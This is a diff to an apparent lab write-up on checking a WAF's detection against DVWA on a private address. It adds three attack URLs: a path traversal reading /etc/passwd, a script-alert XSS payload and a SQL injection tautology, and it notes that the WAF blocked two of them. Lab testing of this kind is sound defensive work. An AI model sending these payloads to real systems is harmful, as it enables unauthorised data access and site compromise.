@@ -134,7 +134,7 @@ Let's check the Detection
 - I am gonna change the path in the URL:
 
 ```shell
-
+http://192.168.164.100/DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
 ```
 
 ![pathtraversal](pathtraversal.png)
@@ -147,8 +147,10 @@ Let's check the Detection
 - I will add a Scripts after "Default=" to attack:
 
 ```shell
-
+192.168.164.100/DVWA/vulnerabilities/xss_d/?default=<script>alert('You have been hacked!')</script>
 ```
+
+- Because of WAF so it's have been blocked:
 
 ![xss](xss.png)
 
@@ -160,8 +162,10 @@ Let's check the Detection
 - I will use this command to attack to the submit:
 
 ```shell
-
+http://192.168.164.100/DVWA/vulnerabilities/sqli/?id=%25%27+or+%270%27%3D%270&Submit=Submit#
 ```
+
+- Because of WAF so it's have been blocked:
 
 ![sql](sql.png)
 
